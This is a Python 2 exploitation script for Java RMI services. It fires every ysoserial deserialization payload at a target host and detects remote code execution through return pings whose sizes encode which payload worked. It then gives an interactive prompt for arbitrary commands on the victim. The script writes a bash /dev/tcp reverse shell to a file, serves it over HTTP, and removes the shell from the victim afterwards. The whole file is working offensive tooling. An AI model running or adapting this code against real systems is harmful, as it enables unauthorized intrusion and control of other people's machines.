#!/usr/bin/env python
#written by ya boi Ian (@n1tp1k)
#Attempts to discover if an RMI service with classloading is vulnerable to deserialization.
#Generates  a series of ysoserial payloads using every vulnerable library
#Vulnerable host will return a series of pings if RCE is achieved, and script will deduce vulnerable libraries based on ping size
#Important to note that in the current version, this tool does not enumerate all libraries that will work on the victim. It will shotgun blast all payloads and print the name of whichever payload pings back first.

#TODO
##add linux/windows autopwn
##import hosts/ports as list
##perform OS detection on potential victim (maybe simple ttl check)

#IMPORTS
from argparse import ArgumentParser #for handling of command line arguments
import socket                       #for handling packet captures
import os                           #for handling some linux functionality, such as checking if script execution is as root and making sure ysoserial exists
import subprocess                   #for launching ysoserial
import threading                    #for handling concurrent threads (listening for pings while launching payloads)
from threading import Thread
import SimpleHTTPServer             #for running web server
import SocketServer                 #for running web server

#GLOBAL
#dictionary of ping size values and the corresponding payload library being used. Since every payload is used twice (once for windows and once for *nix) the keys increment by two
payload_dict = {0:'CommonsCollections1',
                        2:'Jdk7u21',
                        4:'CommonsCollections3',
                        6:'CommonsCollections6',
                        8:'CommonsCollections2',
                        10:'CommonsCollections4',
                        12:'CommonsCollections5',
                        14:'Spring1',
                        16:'Spring2',
                        18:'BeanShell1',
                        20:'Groovy1',
                        22:'CommonsBeanutils1',
                        24:'C3P0',
                        26:'Clojure',
                        28:'FileUpload1',
                        30:'Hibernate1',
                        32:'Hibernate2',
                        34:'JBossInterceptors1',
                        36:'JRMPClient',
                        38:'JRMPListener',
                        40:'JSON1',
                        42:'JavassistWeld1',
                        44:'Jython1',
                        46:'MozillaRhino1',
                        48:'Myfaces1',
                        50:'Myfaces2',
                        52:'ROME',
                        54:'URLDNS',
                        56:'Wicket1'}

class Exploit:
    def __init__(self, lhost, rport, rhost, ysoPath, verbose,timeout):
        self.lhost = lhost
        self.rport = rport
        self.rhost = rhost
        self.ysoPath = ysoPath
        self.verbose = verbose
        self.timeout = timeout
        self.lport = 4444
        self.webPort = 8080
        self.pingSize = 0

    def splash(self):
        print """$$$$$$$\  $$\      $$\ $$$$$$\        $$$$$$\  $$\                  $$\                                   
$$  __$$\ $$$\    $$$ |\_$$  _|      $$  __$$\ $$ |                 $$ |                                  
$$ |  $$ |$$$$\  $$$$ |  $$ |        $$ /  \__|$$$$$$$\   $$$$$$\ $$$$$$\    $$$$$$\  $$\   $$\ $$$$$$$\  
$$$$$$$  |$$\$$\$$ $$ |  $$ |        \$$$$$$\  $$  __$$\ $$  __$$\\\_$$  _|  $$  __$$\ $$ |  $$ |$$  __$$\ 
$$  __$$< $$ \$$$  $$ |  $$ |         \____$$\ $$ |  $$ |$$ /  $$ | $$ |    $$ /  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |$$ |\$  /$$ |  $$ |        $$\   $$ |$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |$$ | \_/ $$ |$$$$$$\       \$$$$$$  |$$ |  $$ |\$$$$$$  | \$$$$  |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
\__|  \__|\__|     \__|\______|       \______/ \__|  \__| \______/   \____/  \____$$ | \______/ \__|  \__|
                                                                            $$\   $$ |                    
                                                                            \$$$$$$  |                    
                                                                             \______/                     """

    def craftShell(self):
        #writes standard bash reverse shell into current directory
        self.lport = raw_input('[$] Enter local port to listen for shell on: ')
        print("[$] Creating payload shell and placing in current directory")
        cmd = 'echo "bash -i >& /dev/tcp/'+self.lhost+'/'+self.lport+' 0>&1" > ./shell.sh'
        subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE)
        
    def startWebServer(self):
        #opens a web server on port 8080 serving the current directory
        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
        httpd = SocketServer.TCPServer(("", self.webPort), Handler, bind_and_activate=False)
        httpd.allow_reuse_address = True
        try:
            httpd.server_bind()
            httpd.server_activate()
            print("[$] Hosting web server on port "+str(self.webPort))
            #http server will only handle a single request (should be only one GET to the shell file)
            httpd.handle_request()
        except:
            httpd.server_close()
            print("[X] HTTP Server failed to bind or activate")

    def listen(self):
        pingReturned = True
        print("[$] Listening for pings")     
        #create socket to listen for an icmp packet hitting localhost
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            #in this case the socket timeout is basically how long you want to wait before giving up on getting a ping back
            s.settimeout(float(self.timeout))
            try:   
                #receive packet data
                packet = s.recvfrom(65565)
                #subtract 28 from packet length, pings set to a size of zero have a length of 28
                self.pingSize = len(packet[0]) - 28
            except:
                print("[X] No pings received, socket timed out")
                pingReturned = False
            try:
                s.close()
                print("[$] Closing ping listener")
            except socket.error , msg:
                print('[X] Socket could not be closed. Error Code: ' + str(msg[0]) + ' Message: ' + msg[1])

            #deduce which payload was successful based on the size of the ping hitting the host
            #all windows payloads are even numbers, and their linux exquivalents are incremented by one
            if pingReturned:
		if self.pingSize % 2 == 0:
		    print("[$] "+str(payload_dict.get(self.pingSize))+" windows payload successful!")
		    #open prompt to let use execute arbitrary commands on the vulnerable host
		    self.windowsInput()
		else:
		    print("[$] "+str(payload_dict.get(self.pingSize-1))+" linux payload successful!")
		    #open prompt to let use execute arbitrary commands on the vulnerable host
		    self.linuxInput()
        except socket.error , msg:
            print('[X] Socket could not be created. Error Code: ' + str(msg[0]) + ' Message: ' + msg[1])

    def catchShell(self):
        #Start reverse shell listener
        print("[$] Starting payload listener on port "+str(self.lport))
        #listen for everything
        target = "0.0.0.0"
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind((target,int(self.lport)))
        except socket.error, msg:
             print('[X] Socket for shell catcher could not be created. Error Code: ' + str(msg[0]) + ' Message: ' + msg[1])
        server.listen(5)

        #clean up shell placed when shell closes
        print("[$] Deleting shell from victim")
        self.ysoRMIExploit("rm /tmp/shell.sh",payload_dict.get(self.pingSize-1))       

    def windowsInput(self):
        exitCmd = True
        #prompt user to input a series of commands on the vulnerable host
        while exitCmd:
            cmd = raw_input('[$] Enter system command to run on vulnerable host (enter "quit" to exit): ')
            if str(cmd) == 'quit':
                exitCmd = False
            else:
                self.ysoRMIExploit(str(cmd), payload_dict.get(self.pingSize))
                
    def linuxInput(self):
        #if a payload lands, prompt script user to be able to execute other system commands
        exitCmd = True
        while exitCmd:
            cmd = raw_input('[$] Enter system command to run on vulnerable host (enter "quit" to exit): ')
            if str(cmd) == 'quit':
                exitCmd = False
            else:
                self.ysoRMIExploit(str(cmd), payload_dict.get(self.pingSize-1))
                
    def craftPayload(self):
        print("[$] Crafting ysoserial payloads")
        while self.pingSize <= 56: #while dictionary of payloads hasn't been exhausted
            payloadType = payload_dict.get(self.pingSize)
            #single windows ping
            cmd = 'ping -r 1 -l '+str(self.pingSize)+' '+self.lhost
            self.ysoRMIExploit(cmd,payloadType)
            #increment ping size by one to differentiate between windows and linux hosts 
            self.pingSize +=1
            #single linux ping back
            cmd = '/bin/bash -c \'ping -c 1 -s '+str(self.pingSize)+' '+self.lhost+'\''
            self.ysoRMIExploit(cmd, payloadType)
            self.pingSize +=1

    def ysoRMIExploit(self,cmd, payloadType):
        ysoCmd = 'java -cp '+self.ysoPath+' ysoserial.exploit.RMIRegistryExploit '+self.rhost+' '+self.rport+' '+payloadType+' "'+cmd+'"'
        #if the verbose flag is set print all ysoserial payload
        if self.verbose:
            print(ysoCmd)
        p = subprocess.Popen(ysoCmd, shell=True, stderr=subprocess.PIPE)

    def run(self):
        if not os.getuid(): #check to make sure script is running as root
            #print splash
            self.splash()
            #start packet capture listener
            try:
                listener = Thread(target = self.listen)
            except:
                print("[X] Unable to spawn thread to start ping listener")
            #make ysoserial payload
            if os.path.isfile(self.ysoPath):#checks if there is a file in the user provided ysoserial path
                try:
                    payload = Thread(target = self.craftPayload)
                except:
                    print("[X] Unable to spawn thread to start ysoserial payload generator")
                #launch both threads to run concurrently
                listener.start()
                payload.start()
            else:
                print("[X] Path to ysoserial jar file is not correct")
            
        else:
            print("[X] Script must run as sudo to work properly")

#argument parser
if __name__ == "__main__":
    parser = ArgumentParser(
        description = "Script that attempts to discover if an RMI service with classloading enabled is vulnerable to deserialization."
    )

    parser.add_argument(
        '-l',
        '--lhost',
        required=True,
        dest='lhost',
        nargs='?',
        help='The listening host that the target should connect back to'
    )#add argument local host

    parser.add_argument(
        '-p',
        '--rport',
        required=True,
        dest='rport',
        nargs='?',
        help='The remote port that is running RMI'
    )#add argument remote port

    parser.add_argument(
        '-r',
        '--rhost',
        required=True,
        dest='rhost',
        nargs='?',
        help='The target host to exploit'
    )#add argument remote host

    parser.add_argument(
        '-y',
        '--ysoPath',
        dest='ysoPath',
        nargs='?',
        default='ysoserial.jar',
        help="Path to ysoserial jar file, default is ./ysoserial.jar"
    )#add argument for ysoserial path

    parser.add_argument(
        '-v',
        '--verbose',
        dest='verbose',
        action="store_true",
        help="Verbose mode, will print all ysoserial requests being generated"
    )#add verbose flag

    parser.add_argument(
        '-t',
        '--timeout',
        dest='timeout',
        default=30,
        help="Time to leave listening socket open for ping response"
    )#add timeout flag

    args = parser.parse_args()

    exploit = Exploit(lhost=args.lhost, rport=args.rport, rhost=args.rhost, ysoPath=args.ysoPath, verbose=args.verbose, timeout=args.timeout)
    exploit.run()
